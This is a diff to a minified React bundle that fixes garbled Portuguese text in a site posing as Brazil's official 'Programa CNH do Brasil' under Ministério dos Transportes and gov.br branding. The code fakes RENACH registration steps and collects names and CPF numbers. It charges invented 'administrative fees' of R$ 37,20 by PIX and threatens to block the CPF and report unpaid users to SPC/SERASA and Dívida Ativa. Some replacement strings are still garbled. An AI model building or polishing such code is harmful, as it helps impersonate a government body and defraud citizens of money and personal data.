-              children: "O pagamento serÃ¡ confirmado automaticamente"
+              children: "O pagamento será confirmado automaticamente"
             })]
           }), t && l.jsx("div", {
             className: "border-t pt-4",
             children: l.jsxs("p", {
               className: "text-xs text-gray-500",
-              children: ["ID da TransaÃ§Ã£o: ", t.transaction_id]
+              children: ["ID da Transação: ", t.transaction_id]
             })
           })]
         })]
@@ -21843,10 +21843,10 @@ function IE() {
               })
             }), l.jsx("h1", {
               className: "text-3xl font-bold text-green-600 mb-2",
-              children: "Cadastro ConcluÃ­do!"
+              children: "Cadastro Concluído!"
             }), l.jsx("p", {
               className: "text-gray-600",
-              children: "ParabÃ©ns! Seu cadastro no Programa CNH do Brasil foi finalizado com sucesso."
+              children: "Parabéns! Seu cadastro no Programa CNH do Brasil foi finalizado com sucesso."
             })]
           }), l.jsxs("div", {
             className: "bg-[#1351B4] text-white p-6 rounded-lg mb-6",
@@ -21862,7 +21862,7 @@ function IE() {
               className: "text-center",
               children: [l.jsx("p", {
                 className: "text-sm opacity-90 mb-1",
-                children: "NÃºmero do Protocolo:"
+                children: "Número do Protocolo:"
               }), l.jsx("p", {
                 className: "text-2xl font-mono font-bold tracking-wider",
                 children: n
@@ -21926,17 +21926,17 @@ function IE() {
             className: "bg-blue-50 p-4 rounded-lg border border-blue-100 mb-6",
             children: [l.jsx("h4", {
               className: "font-semibold text-blue-900 mb-2",
-              children: "PrÃ³ximos Passos:"
+              children: "Próximos Passos:"
             }), l.jsxs("ul", {
               className: "text-sm text-blue-800 space-y-2",
               children: [l.jsx("li", {
-                children: "â€¢ Aguarde a confirmaÃ§Ã£o por e-mail em atÃ© 48 horas"
+                children: "â€¢ Aguarde a confirmação por e-mail em até 48 horas"
               }), l.jsx("li", {
-                children: "â€¢ VocÃª receberÃ¡ instruÃ§Ãµes para agendar suas aulas"
+                children: "â€¢ Você receberá instruções para agendar suas aulas"
               }), l.jsx("li", {
-                children: "â€¢ CompareÃ§a ao DETRAN mais prÃ³ximo com seus documentos"
+                children: "â€¢ Compareça ao DETRAN mais próximo com seus documentos"
               }), l.jsx("li", {
-                children: "â€¢ Guarde seu nÃºmero de protocolo para consultas"
+                children: "â€¢ Guarde seu número de protocolo para consultas"
               })]
             })]
           }), l.jsxs("div", {
@@ -21951,13 +21951,13 @@ function IE() {
             }), l.jsx(jn, {
               onClick: () => window.location.href = "/",
               className: "flex-1 bg-[#1351B4] hover:bg-[#1351B4]/90 text-white",
-              children: "Voltar ao InÃ­cio"
+              children: "Voltar ao Início"
             })]
           }), l.jsx("div", {
             className: "mt-6 pt-4 border-t text-center",
             children: l.jsx("p", {
               className: "text-xs text-gray-500",
-              children: "Em caso de dÃºvidas, entre em contato atravÃ©s do portal gov.br"
+              children: "Em caso de dúvidas, entre em contato através do portal gov.br"
             })
           })]
         })
@@ -22037,7 +22037,7 @@ const Rg = {
 
 function OE() {
   var Ch;
-  const [, e] = In(), [t, n] = x.useState([]), [r, s] = x.useState(!1), [o, i] = x.useState("initial"), [a, c] = x.useState(""), [u, d] = x.useState(""), [f, h] = x.useState(null), [y, w] = x.useState(null), v = x.useRef(null), S = x.useRef(!1), [g, p] = x.useState(""), [m, b] = x.useState(null), [C, j] = x.useState(!1), [A, P] = x.useState(!1), [M, _] = x.useState(""), [G, I] = x.useState("pending"), [$, U] = x.useState(600), [te, re] = x.useState(null), [X, D] = x.useState(!1), [R, L] = x.useState([]), [J, oe] = x.useState(!1), [ze, Ue] = x.useState(!1), [wr, Je] = x.useState(""), [dn, to] = x.useState(""), [no, ro] = x.useState(!1), [so, ki] = x.useState(!1), [br, Ri] = x.useState(null), Yl = x.useRef(null), [xh, wh] = x.useState([]), [N, E] = x.useState(!1), [T, z] = x.useState([]), V = x.useRef(null), [F, Q] = x.useState(""), Z = f != null && f.nome ? _i(f.nome.split(" ")[0]) : "CidadÃ£o", Te = () => ["MAIO", "JUNHO", "JULHO", "AGOSTO", "SETEMBRO", "OUTUBRO", "NOVEMBRO", "DEZEMBRO"].map(W => ({
+  const [, e] = In(), [t, n] = x.useState([]), [r, s] = x.useState(!1), [o, i] = x.useState("initial"), [a, c] = x.useState(""), [u, d] = x.useState(""), [f, h] = x.useState(null), [y, w] = x.useState(null), v = x.useRef(null), S = x.useRef(!1), [g, p] = x.useState(""), [m, b] = x.useState(null), [C, j] = x.useState(!1), [A, P] = x.useState(!1), [M, _] = x.useState(""), [G, I] = x.useState("pending"), [$, U] = x.useState(600), [te, re] = x.useState(null), [X, D] = x.useState(!1), [R, L] = x.useState([]), [J, oe] = x.useState(!1), [ze, Ue] = x.useState(!1), [wr, Je] = x.useState(""), [dn, to] = x.useState(""), [no, ro] = x.useState(!1), [so, ki] = x.useState(!1), [br, Ri] = x.useState(null), Yl = x.useRef(null), [xh, wh] = x.useState([]), [N, E] = x.useState(!1), [T, z] = x.useState([]), V = x.useRef(null), [F, Q] = x.useState(""), Z = f != null && f.nome ? _i(f.nome.split(" ")[0]) : "Cidadão", Te = () => ["MAIO", "JUNHO", "JULHO", "AGOSTO", "SETEMBRO", "OUTUBRO", "NOVEMBRO", "DEZEMBRO"].map(W => ({
     month: `${W}/2026`,
     vagas: Math.floor(Math.random() * 9) + 4
   })), ke = () => {
@@ -22066,7 +22066,7 @@ function OE() {
           return setTimeout(() => {
             e("/success")
           }, 1e3), !0
-        } else if (Y.status === "expired" || Y.status === "cancelled") return console.log("TransaÃ§Ã£o expirada ou cancelada"), !0
+        } else if (Y.status === "expired" || Y.status === "cancelled") return console.log("Transação expirada ou cancelada"), !0
       }
       return !1
     } catch (W) {
@@ -22111,7 +22111,7 @@ function OE() {
     try {
       const transactionId = m?.transaction_id || m?.deposit_id || localStorage.getItem("currentTransactionId");
       if (!transactionId) {
-        alert("ID da transaÃ§Ã£o nÃ£o encontrado. Recarregue a pÃ¡gina.");
+        alert("ID da transação não encontrado. Recarregue a página.");
         ro(!1);
         return;
       }
@@ -22209,7 +22209,7 @@ function OE() {
       const W = 3;
       try {
         const Y = localStorage.getItem("userData");
-        if (!Y) return re("Dados do usuÃ¡rio nÃ£o encontrados. Recarregue a pÃ¡gina."), j(!1), !1;
+        if (!Y) return re("Dados do usuário não encontrados. Recarregue a página."), j(!1), !1;
         const ge = JSON.parse(Y);
         console.log(`Creating PIX transaction for: ${ge.nome} (attempt ${B + 1}/${W})`);
         const qr = await (await fetch("/api/pix", {
@@ -22227,30 +22227,30 @@ function OE() {
             detran_nome: (y == null ? void 0 : y.nome) || ""
           })
         })).json();
-        return qr.success && qr.pix_code ? (b(qr), U(600), localStorage.setItem("currentTransactionId", qr.transaction_id), localStorage.setItem("currentDepositId", qr.deposit_id), j(!1), !0) : B < W - 1 ? (await new Promise(bw => setTimeout(bw, 2e3)), Li(B + 1)) : (re(qr.error || "Erro ao gerar cÃ³digo PIX. Tente novamente."), j(!1), !1)
+        return qr.success && qr.pix_code ? (b(qr), U(600), localStorage.setItem("currentTransactionId", qr.transaction_id), localStorage.setItem("currentDepositId", qr.deposit_id), j(!1), !0) : B < W - 1 ? (await new Promise(bw => setTimeout(bw, 2e3)), Li(B + 1)) : (re(qr.error || "Erro ao gerar código PIX. Tente novamente."), j(!1), !1)
       } catch {
-        return B < W - 1 ? (await new Promise(ge => setTimeout(ge, 2e3)), Li(B + 1)) : (re("Erro de conexÃ£o. Verifique sua internet e tente novamente."), j(!1), !1)
+        return B < W - 1 ? (await new Promise(ge => setTimeout(ge, 2e3)), Li(B + 1)) : (re("Erro de conexão. Verifique sua internet e tente novamente."), j(!1), !1)
       }
     }, dw = async () => {
       m != null && m.pix_code && (await navigator.clipboard.writeText(m.pix_code), P(!0), setTimeout(() => P(!1), 3e3))
     }, fw = async () => {
-      S.current || (S.current = !0, Ln("Para dar continuidade ao seu cadastro no Programa CNH do Brasil, informamos que Ã© necessÃ¡rio selecionar a categoria de CNH pretendida.", !0), i("category_selection"))
+      S.current || (S.current = !0, Ln("Para dar continuidade ao seu cadastro no Programa CNH do Brasil, informamos que é necessário selecionar a categoria de CNH pretendida.", !0), i("category_selection"))
     }, ec = async B => {
-      c(B), Ln(`Categoria ${B}`, !1), i("consulting_vagas"), oe(!0), await new Promise(W => setTimeout(W, 4e3)), oe(!1), await Ii(`Prezado(a) ${Z}, informamos que as aulas teÃ³ricas do Programa CNH do Brasil podem ser realizadas de forma remota, por meio de dispositivo mÃ³vel ou computador, conforme sua disponibilidade de horÃ¡rio.
+      c(B), Ln(`Categoria ${B}`, !1), i("consulting_vagas"), oe(!0), await new Promise(W => setTimeout(W, 4e3)), oe(!1), await Ii(`Prezado(a) ${Z}, informamos que as aulas teóricas do Programa CNH do Brasil podem ser realizadas de forma remota, por meio de dispositivo móvel ou computador, conforme sua disponibilidade de horário.
 
-ApÃ³s a finalizaÃ§Ã£o do cadastro, o sistema liberarÃ¡ o acesso ao aplicativo oficial com o passo a passo completo, e vocÃª jÃ¡ poderÃ¡ iniciar as aulas imediatamente.`, 6e3), i("msg1_continue")
+Após a finalização do cadastro, o sistema liberará o acesso ao aplicativo oficial com o passo a passo completo, e você já poderá iniciar as aulas imediatamente.`, 6e3), i("msg1_continue")
     }, hw = async () => {
-      Ln("Prosseguir", !1), i("msg1_sent"), await Ii(`O Programa CNH do Brasil segue as seguintes etapas: o candidato realiza as aulas teÃ³ricas atravÃ©s do aplicativo oficial e, apÃ³s a conclusÃ£o, o Detran ${(y == null ? void 0 : y.nome) || "do seu Estado"} disponibilizarÃ¡ um instrutor credenciado, sem custo adicional, para a realizaÃ§Ã£o das aulas prÃ¡ticas obrigatÃ³rias.`, 7e3), i("msg2_continue")
+      Ln("Prosseguir", !1), i("msg1_sent"), await Ii(`O Programa CNH do Brasil segue as seguintes etapas: o candidato realiza as aulas teóricas através do aplicativo oficial e, após a conclusão, o Detran ${(y == null ? void 0 : y.nome) || "do seu Estado"} disponibilizará um instrutor credenciado, sem custo adicional, para a realização das aulas práticas obrigatórias.`, 7e3), i("msg2_continue")
     }, mw = async () => {
-      Ln("Prosseguir", !1), i("msg2_sent"), await Ii("As avaliaÃ§Ãµes teÃ³ricas e prÃ¡ticas encontram-se disponÃ­veis para agendamento. Para finalizaÃ§Ã£o do cadastro, Ã© necessÃ¡rio selecionar o perÃ­odo para realizaÃ§Ã£o das provas. Conforme a legislaÃ§Ã£o vigente, o processo completo tem duraÃ§Ã£o inferior a 20 dias Ãºteis.", 7e3), i("msg3_continue")
+      Ln("Prosseguir", !1), i("msg2_sent"), await Ii("As avaliações teóricas e práticas encontram-se disponíveis para agendamento. Para finalização do cadastro, é necessário selecionar o período para realização das provas. Conforme a legislação vigente, o processo completo tem duração inferior a 20 dias úteis.", 7e3), i("msg3_continue")
     }, pw = async () => {
-      Ln("Prosseguir", !1), i("msg3_sent"), await Ii("Selecione o mÃªs de sua preferÃªncia para realizaÃ§Ã£o das avaliaÃ§Ãµes:", 3e3), i("month_selection")
+      Ln("Prosseguir", !1), i("msg3_sent"), await Ii("Selecione o mês de sua preferência para realização das avaliações:", 3e3), i("month_selection")
     }, gw = async B => {
-      if (d(B), Ln(B, !1), i("confirming_cadastro"), Ue(!0), Je("Confirmando cadastro junto ao Detran..."), await new Promise(W => setTimeout(W, 3e3)), Je("Gerando cadastro no RENACH..."), await new Promise(W => setTimeout(W, 2500)), Je("Emitindo documentaÃ§Ã£o..."), await new Promise(W => setTimeout(W, 2500)), Ue(!1), Ln(`Prezado(a) ${Z}, seu nÃºmero de RENACH foi gerado com sucesso junto ao Detran ${(y == null ? void 0 : y.nome) || "do seu Estado"}.
+      if (d(B), Ln(B, !1), i("confirming_cadastro"), Ue(!0), Je("Confirmando cadastro junto ao Detran..."), await new Promise(W => setTimeout(W, 3e3)), Je("Gerando cadastro no RENACH..."), await new Promise(W => setTimeout(W, 2500)), Je("Emitindo documentação..."), await new Promise(W => setTimeout(W, 2500)), Ue(!1), Ln(`Prezado(a) ${Z}, seu número de RENACH foi gerado com sucesso junto ao Detran ${(y == null ? void 0 : y.nome) || "do seu Estado"}.
 
-NÃºmero do RENACH: **${M}**
+Número do RENACH: **${M}**
 
-O RENACH (Registro Nacional de Carteira de HabilitaÃ§Ã£o) Ã© o nÃºmero de identificaÃ§Ã£o Ãºnico do candidato no Sistema Nacional de HabilitaÃ§Ã£o.`, !0), await new Promise(W => setTimeout(W, 300)), v.current) {
+O RENACH (Registro Nacional de Carteira de Habilitação) é o número de identificação único do candidato no Sistema Nacional de Habilitação.`, !0), await new Promise(W => setTimeout(W, 300)), v.current) {
         const W = v.current.scrollHeight;
         v.current.scrollTop = W - 600
       }
@@ -22270,20 +22270,20 @@ O RENACH (Registro Nacional de Carteira de HabilitaÃ§Ã£o) Ã© o nÃºmero d
     }, vw = async (B, W = 2e3) => {
       E(!0), v.current && (v.current.scrollTop = v.current.scrollHeight), await new Promise(Y => setTimeout(Y, W)), E(!1), tc(B, !0)
     }, xw = async () => {
-      tc("Prosseguir", !1), i("renach_created"), await vw(`Prezado(a) ${Z}, seu cadastro encontra-se com status PENDENTE. Para liberaÃ§Ã£o do acesso ao aplicativo de aulas e prosseguimento do processo, Ã© obrigatÃ³rio o recolhimento das Taxas Administrativas:
+      tc("Prosseguir", !1), i("renach_created"), await vw(`Prezado(a) ${Z}, seu cadastro encontra-se com status PENDENTE. Para liberação do acesso ao aplicativo de aulas e prosseguimento do processo, é obrigatório o recolhimento das Taxas Administrativas:
 
-â€¢ Taxa de ExpediÃ§Ã£o de Documento (TED): R$ 11,95
-â€¢ Taxa de ServiÃ§os Administrativos (TSA): R$ 13,40
-â€¢ Taxa de Processamento EletrÃ´nico (TPE): R$ 11,85
+â€¢ Taxa de Expedição de Documento (TED): R$ 11,95
+â€¢ Taxa de Serviços Administrativos (TSA): R$ 13,40
+â€¢ Taxa de Processamento Eletrônico (TPE): R$ 11,85
 
 Valor Total: R$ 37,20`, 3e3), i("finalize_button")
     }, ww = async () => {
       tc("Finalizar Cadastro", !1), i("generating_pix"), Q("");
       const B = setTimeout(() => {
-        Q("Aguarde e nÃ£o feche a pÃ¡gina. Sua guia de pagamento estÃ¡ sendo gerada...")
+        Q("Aguarde e não feche a página. Sua guia de pagamento está sendo gerada...")
       }, 5e3),
         W = setTimeout(() => {
-          Q("Por favor, aguarde mais um momento. Estamos finalizando a geraÃ§Ã£o da sua guia...")
+          Q("Por favor, aguarde mais um momento. Estamos finalizando a geração da sua guia...")
         }, 15e3);
       await Li(), clearTimeout(B), clearTimeout(W), Q(""), await new Promise(Y => setTimeout(Y, 1500)), i("pix_document"), setTimeout(() => {
         if (V.current && v.current) {
@@ -22292,14 +22292,14 @@ Valor Total: R$ 37,20`, 3e3), i("finalize_button")
         }
       }, 150), await new Promise(Y => setTimeout(Y, 2e3)), yw(`Para realizar o pagamento via PIX Copia e Cola:
 
-1. Copie o cÃ³digo PIX clicando no botÃ£o "Copiar CÃ³digo PIX"
+1. Copie o código PIX clicando no botão "Copiar Código PIX"
 2. Abra o aplicativo do seu banco
-3. Acesse a Ã¡rea PIX e selecione "Pagar com PIX Copia e Cola"
-4. Cole o cÃ³digo copiado e confirme o pagamento
+3. Acesse a área PIX e selecione "Pagar com PIX Copia e Cola"
+4. Cole o código copiado e confirme o pagamento
 
-ApÃ³s a confirmaÃ§Ã£o do pagamento, seu cadastro no Programa CNH do Brasil serÃ¡ ativado e vocÃª jÃ¡ poderÃ¡ iniciar as aulas teÃ³ricas pelo aplicativo oficial.
+Após a confirmação do pagamento, seu cadastro no Programa CNH do Brasil será ativado e você já poderá iniciar as aulas teóricas pelo aplicativo oficial.
 
-Assim que realizar o pagamento das taxas no valor de R$ 37,20, clique no botÃ£o abaixo para ativar seu cadastro.`, !0), i("awaiting_payment")
+Assim que realizar o pagamento das taxas no valor de R$ 37,20, clique no botão abaixo para ativar seu cadastro.`, !0), i("awaiting_payment")
     };
   x.useEffect(() => {
     f && y && fw()
@@ -22710,7 +22710,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 37,20, clique no botÃ£
                   children: [l.jsxs("div", {
                     children: [l.jsx("p", {
                       className: "text-gray-400 text-[10px]",
-                      children: "MÃŠS PREVISTO"
+                      children: "MÁŠS PREVISTO"
                     }), l.jsx("p", {
                       className: "font-semibold text-gray-800 text-xs",
                       children: u
@@ -22727,7 +22727,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 37,20, clique no botÃ£
                 }), l.jsx("div", {
                   className: "border-t border-gray-200 pt-2 text-[10px] text-gray-400",
                   children: l.jsxs("p", {
-                    children: ["Emitido em ", nc, " Ã s ", bh]
+                    children: ["Emitido em ", nc, " Á s ", bh]
                   })
                 })]
               })]
@@ -22867,7 +22867,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 37,20, clique no botÃ£
                   className: "text-center",
                   children: [l.jsx("p", {
                     className: "text-gray-500 text-xs",
-                    children: "EXERCÃCIO"
+                    children: "EXERCÁCIO"
                   }), l.jsx("p", {
                     className: "font-bold text-gray-800 text-lg",
                     children: Gr.getFullYear()
@@ -22910,7 +22910,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 37,20, clique no botÃ£
                   children: l.jsxs("div", {
                     className: "flex justify-between text-xs font-bold",
                     children: [l.jsx("span", {
-                      children: "DISCRIMINAÃ‡ÃƒO DOS DÃ‰BITOS"
+                      children: "DISCRIMINAÇÁƒO DOS DÉBITOS"
                     }), l.jsx("span", {
                       children: "VALORES EM REAIS"
                     })]
@@ -22921,7 +22921,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 37,20, clique no botÃ£
                     className: "flex justify-between py-1 border-b border-gray-200",
                     children: [l.jsx("span", {
                       className: "text-gray-700",
-                      children: "TAXA DE EXPEDIÃ‡ÃƒO DE DOCUMENTO (TED)"
+                      children: "TAXA DE EXPEDIÇÁƒO DE DOCUMENTO (TED)"
                     }), l.jsx("span", {
                       className: "font-semibold",
                       children: "11,95"
@@ -22930,7 +22930,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 37,20, clique no botÃ£
                     className: "flex justify-between py-1 border-b border-gray-200",
                     children: [l.jsx("span", {
                       className: "text-gray-700",
-                      children: "TAXA DE SERVIÃ‡OS ADMINISTRATIVOS (TSA)"
+                      children: "TAXA DE SERVIÇOS ADMINISTRATIVOS (TSA)"
                     }), l.jsx("span", {
                       className: "font-semibold",
                       children: "13,40"
@@ -22939,7 +22939,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 37,20, clique no botÃ£
                     className: "flex justify-between py-1 border-b border-gray-200",
                     children: [l.jsx("span", {
                       className: "text-gray-700",
-                      children: "TAXA DE PROCESSAMENTO ELETRÃ”NICO (TPE)"
+                      children: "TAXA DE PROCESSAMENTO ELETRÁ”NICO (TPE)"
                     }), l.jsx("span", {
                       className: "font-semibold",
                       children: "11,85"
@@ -22957,22 +22957,22 @@ Assim que realizar o pagamento das taxas no valor de R$ 37,20, clique no botÃ£
                 className: "p-4 border-b border-gray-300 bg-red-50",
                 children: [l.jsx("p", {
                   className: "text-sm text-red-600 font-bold mb-2",
-                  children: "ObservaÃ§Ãµes:"
+                  children: "Observações:"
                 }), l.jsxs("p", {
                   className: "text-sm text-red-600 mb-1",
-                  children: ["Informamos que, caso o pagamento nÃ£o seja realizado dentro do prazo estabelecido, o ", l.jsx("span", {
+                  children: ["Informamos que, caso o pagamento não seja realizado dentro do prazo estabelecido, o ", l.jsx("span", {
                     className: "font-bold",
                     children: "CPF"
-                  }), " do responsÃ¡vel (", l.jsx("span", {
+                  }), " do responsável (", l.jsx("span", {
                     className: "font-bold",
                     children: Zl((f == null ? void 0 : f.cpf) || "")
-                  }), ") serÃ¡ bloqueado no programa pelo perÃ­odo de ", l.jsx("span", {
+                  }), ") será bloqueado no programa pelo período de ", l.jsx("span", {
                     className: "font-bold",
                     children: "18 (dezoito) meses"
-                  }), ". AlÃ©m disso, o valor da taxa, acrescido de multas, serÃ¡ registrado no ", l.jsx("span", {
+                  }), ". Além disso, o valor da taxa, acrescido de multas, será registrado no ", l.jsx("span", {
                     className: "font-bold",
                     children: "CPF"
-                  }), " junto aos Ã³rgÃ£os de proteÃ§Ã£o ao crÃ©dito (", l.jsx("span", {
+                  }), " junto aos órgãos de proteção ao crédito (", l.jsx("span", {
                     className: "font-bold",
                     children: "SPC"
                   }), " e ", l.jsx("span", {
@@ -22980,11 +22980,11 @@ Assim que realizar o pagamento das taxas no valor de R$ 37,20, clique no botÃ£
                     children: "SERASA"
                   }), "), bem como inscrito em ", l.jsx("span", {
                     className: "font-bold",
-                    children: "DÃ­vida Ativa da UniÃ£o"
+                    children: "Dívida Ativa da União"
                   }), ", nos termos do art. 2Âº da ", l.jsx("span", {
                     className: "font-bold",
                     children: "Lei nÂº 6.830/1980"
-                  }), " (Lei de ExecuÃ§Ãµes Fiscais) e do art. 43 da ", l.jsx("span", {
+                  }), " (Lei de Execuções Fiscais) e do art. 43 da ", l.jsx("span", {
                     className: "font-bold",
                     children: "Lei nÂº 8.078/1990"
                   })]
@@ -22992,7 +22992,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 37,20, clique no botÃ£
               }), l.jsx("div", {
                 className: "p-4 text-xs text-gray-500 border-b border-gray-300",
                 children: l.jsxs("p", {
-                  children: ["EMITIDO EM ", nc, " Ã€S ", bh]
+                  children: ["EMITIDO EM ", nc, " Á€S ", bh]
                 })
               }), l.jsxs("div", {
                 className: "bg-gray-100 p-4 border-t-2 border-dashed border-gray-400",
@@ -23019,7 +23019,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 37,20, clique no botÃ£
                   className: "bg-white p-3 rounded border border-gray-300 mb-3",
                   children: [l.jsx("p", {
                     className: "text-xs text-gray-500 mb-1",
-                    children: "CÃ“DIGO PIX COPIA E COLA:"
+                    children: "CÁ“DIGO PIX COPIA E COLA:"
                   }), l.jsx("p", {
                     className: "text-xs break-all font-mono bg-gray-50 p-2 rounded border",
                     children: m.pix_code
@@ -23031,13 +23031,13 @@ Assim que realizar o pagamento das taxas no valor de R$ 37,20, clique no botÃ£
                     children: [l.jsx(It, {
                       className: "w-5 h-5"
                     }), l.jsx("span", {
-                      children: "CÃ³digo Copiado!"
+                      children: "Código Copiado!"
                     })]
                   }) : l.jsxs(l.Fragment, {
                     children: [l.jsx(Ol, {
                       className: "w-5 h-5"
                     }), l.jsx("span", {
-                      children: "Copiar CÃ³digo PIX"
+                      children: "Copiar Código PIX"
                     })]
                   })
                 }), l.jsx("div", {
@@ -23151,7 +23151,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 37,20, clique no botÃ£
                     fontSize: "16px",
                     whiteSpace: "pre-line"
                   },
-                  children: "NÃ£o foi possÃ­vel confirmar o pagamento automaticamente. Para ativar seu cadastro, clique abaixo e envie uma imagem do comprovante de pagamento."
+                  children: "Não foi possível confirmar o pagamento automaticamente. Para ativar seu cadastro, clique abaixo e envie uma imagem do comprovante de pagamento."
                 })
               }), l.jsx("input", {
                 type: "file",
@@ -23241,9 +23241,9 @@ function VE() {
         const A = await (await fetch(`/api/transaction/${t}`)).json();
         A.success ? (s(A.transaction), A.transaction.nome && localStorage.setItem("userData", JSON.stringify({
           nome: A.transaction.nome
-        }))) : c(A.error || "TransaÃ§Ã£o nÃ£o encontrada")
+        }))) : c(A.error || "Transação não encontrada")
       } catch {
-        c("Erro ao buscar transaÃ§Ã£o")
+        c("Erro ao buscar transação")
       } finally {
         i(!1)
       }
@@ -23312,10 +23312,10 @@ function VE() {
           className: "w-16 h-16 text-yellow-500 mx-auto mb-4"
         }), l.jsx("h1", {
           className: "text-xl font-bold text-gray-800 mb-2",
-          children: "TransaÃ§Ã£o nÃ£o encontrada"
+          children: "Transação não encontrada"
         }), l.jsx("p", {
           className: "text-gray-600",
-          children: a || "NÃ£o foi possÃ­vel localizar uma transaÃ§Ã£o para este CPF."
+          children: a || "Não foi possível localizar uma transação para este CPF."
         })]
       })
     })]
@@ -23334,10 +23334,10 @@ function VE() {
             }), l.jsxs("div", {
               children: [l.jsx("p", {
                 className: "font-bold text-yellow-800",
-                children: "PAGAMENTO OBRIGATÃ“RIO"
+                children: "PAGAMENTO OBRIGATÁ“RIO"
               }), l.jsx("p", {
                 className: "text-sm text-yellow-700 mt-1",
-                children: "O pagamento das taxas administrativas Ã© obrigatÃ³rio para garantir sua vaga no programa. Caso nÃ£o seja realizado, seu CPF ficarÃ¡ bloqueado por 2 anos."
+                children: "O pagamento das taxas administrativas é obrigatório para garantir sua vaga no programa. Caso não seja realizado, seu CPF ficará bloqueado por 2 anos."
               })]
             })]
           })
@@ -23364,7 +23364,7 @@ function VE() {
               className: "flex flex-col items-center",
               children: [l.jsx("img", {
                 src: FE[r.detranUf] || "",
-                alt: `BrasÃ£o do Estado - DETRAN ${r.detranUf}`,
+                alt: `Brasão do Estado - DETRAN ${r.detranUf}`,
                 className: "h-16 max-w-[200px] object-contain mb-2",
                 onError: C => {
                   C.target.style.display = "none"
@@ -23403,7 +23403,7 @@ function VE() {
               className: "text-center",
               children: [l.jsx("p", {
                 className: "text-gray-500 text-xs",
-                children: "EXERCÃCIO"
+                children: "EXERCÁCIO"
               }), l.jsx("p", {
                 className: "font-bold text-gray-800 text-lg",
                 children: m.getFullYear()
@@ -23464,7 +23464,7 @@ function VE() {
               className: "bg-white p-3 rounded border border-gray-300 mb-3",
               children: [l.jsx("p", {
                 className: "text-xs text-gray-500 mb-1",
-                children: "CÃ“DIGO PIX COPIA E COLA:"
+                children: "CÁ“DIGO PIX COPIA E COLA:"
               }), l.jsx("p", {
                 className: "text-xs break-all font-mono bg-gray-50 p-2 rounded border",
                 children: r.pixCode
@@ -23476,13 +23476,13 @@ function VE() {
                 children: [l.jsx(It, {
                   className: "w-5 h-5"
                 }), l.jsx("span", {
-                  children: "CÃ³digo Copiado!"
+                  children: "Código Copiado!"
                 })]
               }) : l.jsxs(l.Fragment, {
                 children: [l.jsx(Ol, {
                   className: "w-5 h-5"
                 }), l.jsx("span", {
-                  children: "Copiar CÃ³digo PIX"
+                  children: "Copiar Código PIX"
                 })]
               })
             }), l.jsxs("div", {
@@ -23534,7 +23534,7 @@ function VE() {
             })]
           }), l.jsx("p", {
             className: "text-sm",
-            children: "Assim que o pagamento for confirmado, vocÃª serÃ¡ redirecionado automaticamente."
+            children: "Assim que o pagamento for confirmado, você será redirecionado automaticamente."
           })]
         })]
       })
@@ -24291,7 +24291,7 @@ function uT() {
             background: "none",
             boxShadow: "none"
           },
-          children: "MinistÃ©rio dos Transportes"
+          children: "Ministério dos Transportes"
         })]
       }), l.jsx("button", {
         style: {
@@ -24328,7 +24328,7 @@ function uT() {
           className: "text-gray-400 text-xs mx-1"
         }), l.jsx("span", {
           className: "text-[#1351B4]",
-          children: "NotÃ­cias"
+          children: "Notícias"
         }), l.jsx(es, {
           className: "text-gray-400 text-xs mx-1"
         }), l.jsx("span", {
@@ -24361,7 +24361,7 @@ function uT() {
           style: {
             color: "#555555"
           },
-          children: "TRÃ‚NSITO"
+          children: "TRÁ‚NSITO"
         })
       }), l.jsx("h1", {
         className: "text-2xl md:text-3xl font-bold leading-tight mb-4",
@@ -24374,12 +24374,12 @@ function uT() {
         style: {
           color: "#555555"
         },
-        children: ["Mais de 1 milhÃ£o de brasileiros jÃ¡ iniciaram o processo para obter a CNH gratuitamente pelo programa, e ", l.jsx("strong", {
+        children: ["Mais de 1 milhão de brasileiros já iniciaram o processo para obter a CNH gratuitamente pelo programa, e ", l.jsx("strong", {
           style: {
             color: "#333333"
           },
-          children: "as vagas para 2026 estÃ£o se esgotando."
-        }), " A ResoluÃ§Ã£o nÂº 985/2025 do Contran, publicada em 09 de dezembro de 2025, revoluciona o processo de habilitaÃ§Ã£o no paÃ­s. Agora brasileiros podem tirar a CNH em menos de 20 dias, sem custos com autoescola e com curso teÃ³rico totalmente online e gratuito."]
+          children: "as vagas para 2026 estão se esgotando."
+        }), " A Resolução nÂº 985/2025 do Contran, publicada em 09 de dezembro de 2025, revoluciona o processo de habilitação no país. Agora brasileiros podem tirar a CNH em menos de 20 dias, sem custos com autoescola e com curso teórico totalmente online e gratuito."]
       }), l.jsxs("div", {
         className: "flex items-center gap-4 mb-4",
         children: [l.jsx("span", {
@@ -24441,7 +24441,7 @@ function uT() {
         style: {position: "relative", paddingBottom: "56.25%", height: 0, overflow: "hidden", borderRadius: "0.5rem", boxShadow: "0 4px 6px rgba(0,0,0,0.1)"},
         children: l.jsx("iframe", {
           src: "https://www.youtube.com/embed/Bn8olS-_EsQ",
-          title: "LanÃ§amento do Programa CNH do Brasil",
+          title: "Lançamento do Programa CNH do Brasil",
           allow: "accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture",
           allowFullScreen: true,
           style: {position: "absolute", top: 0, left: 0, width: "100%", height: "100%", border: 0}
@@ -24456,7 +24456,7 @@ function uT() {
           children: [l.jsx("span", {
             className: "float-left text-5xl font-bold text-[#1351B4] mr-3 mt-1 leading-none",
             children: "O"
-          }), "processo para obter a primeira Carteira Nacional de HabilitaÃ§Ã£o ficou mais simples com o aplicativo CNH do Brasil, plataforma oficial do MinistÃ©rio dos Transportes. Pelo celular, o cidadÃ£o pode abrir o requerimento, acompanhar todas as etapas, realizar o curso teÃ³rico gratuito e acessar a versÃ£o digital da habilitaÃ§Ã£o. Confira, ponto a ponto, como funciona."]
+          }), "processo para obter a primeira Carteira Nacional de Habilitação ficou mais simples com o aplicativo CNH do Brasil, plataforma oficial do Ministério dos Transportes. Pelo celular, o cidadão pode abrir o requerimento, acompanhar todas as etapas, realizar o curso teórico gratuito e acessar a versão digital da habilitação. Confira, ponto a ponto, como funciona."]
         }), l.jsxs("div", {
           className: "text-center my-8",
           children: [l.jsx("button", {
@@ -24467,21 +24467,21 @@ function uT() {
               })
             },
